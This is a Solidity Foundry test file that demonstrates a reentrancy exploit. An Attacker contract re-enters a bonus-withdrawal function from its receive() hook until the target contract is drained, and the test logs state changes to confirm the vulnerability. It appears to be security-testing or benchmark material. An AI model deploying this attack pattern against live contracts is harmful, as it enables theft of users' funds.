// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

contract Attacker {
    Reentrancy_bonus public target;
    uint256 public reentryCount;

    constructor(Reentrancy_bonus _target) payable {
        target = _target;
    }

    // Receive function triggers reentrancy during reward withdrawal
    receive() external payable {
        if (reentryCount < 4) {
            reentryCount++;
            target.getFirstWithdrawalBonus(address(this));
        }
    }

    // Starts the initial attack
    function attack() external {
        target.getFirstWithdrawalBonus(address(this));
    }
}

contract ReentrancyBonusTest is Test {
    Reentrancy_bonus public bonus;
    Attacker public attacker;
    
    function setUp() public {
        bonus = new Reentrancy_bonus();
        
        // Deposit 500 wei to fund rewards
        vm.deal(address(this), 1 ether);
        bonus.depositFunds{value: 500}();
        
        attacker = new Attacker(bonus);
    }

    function testReentrancyVulnerability() public {
        // Record pre-attack state for all differential variables
        uint256 contractBalanceBefore = address(bonus).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 rewardsDistributedBefore = bonus.totalRewardsDistributed();
        uint256 totalClaimsBefore = bonus.totalBonusClaims();
        uint256 userRewardsBefore = bonus.userTotalRewards(address(attacker));

        console2.log("--- BEFORE-Trigger Attack ---");
        console2.log("Contract ETH Balance:      %d wei", contractBalanceBefore);
        console2.log("Attacker ETH Balance:      %d wei", attackerBalanceBefore);
        console2.log("Total Rewards Distributed: %d wei", rewardsDistributedBefore);
        console2.log("Total Bonus Claims:        %d", totalClaimsBefore);
        console2.log("Attacker Reward Claim:     %d wei", userRewardsBefore);

        console2.log("\n--- Trigger Attack ---");
        attacker.attack();

        // Record post-attack state for differential comparison
        uint256 contractBalanceAfter = address(bonus).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 rewardsDistributedAfter = bonus.totalRewardsDistributed();
        uint256 totalClaimsAfter = bonus.totalBonusClaims();
        uint256 userRewardsAfter = bonus.userTotalRewards(address(attacker));

        console2.log("\n--- AFTER-Trigger Attack ---");
        console2.log("Contract ETH Balance:      %d wei", contractBalanceAfter);
        console2.log("Attacker ETH Balance:      %d wei", attackerBalanceAfter);
        console2.log("Total Rewards Distributed: %d wei", rewardsDistributedAfter);
        console2.log("Total Bonus Claims:        %d", totalClaimsAfter);
        console2.log("Attacker Reward Claim:     %d wei", userRewardsAfter);

        // Compute state changes for final verdict
        bool fundsDrained = contractBalanceAfter == 0;
        bool unauthorizedGain = attackerBalanceAfter - attackerBalanceBefore == 500;
        bool rewardOverdistribution = rewardsDistributedAfter - rewardsDistributedBefore == 500;
        bool multipleClaims = totalClaimsAfter - totalClaimsBefore == 5;
        bool excessiveUserReward = userRewardsAfter - userRewardsBefore == 500;

        console2.log("\n--- Differential Test Results ---");
        console2.log("Contract drained:        %s", fundsDrained ? "YES" : "NO");
        console2.log("Attacker gained 500 wei: %s", unauthorizedGain ? "YES" : "NO");
        console2.log("Distributed 500 wei:     %s", rewardOverdistribution ? "YES" : "NO");
        console2.log("5 bonus claims made:     %s", multipleClaims ? "YES" : "NO");
        console2.log("Attack rewards claimed:  %s", excessiveUserReward ? "YES" : "NO");

        // Final vulnerability verdict based on state changes
        bool vulnerabilityExists = fundsDrained && 
                                unauthorizedGain && 
                                rewardOverdistribution && 
                                multipleClaims && 
                                excessiveUserReward;

        if (vulnerabilityExists) {
            console2.log("\nVulnerability Exists: State changes confirm reentrancy allowed draining contract via multiple withdrawals");
        } else {
            console2.log("\nVulnerability not Exist: Attack did not achieve all expected state changes");
        }
    }
}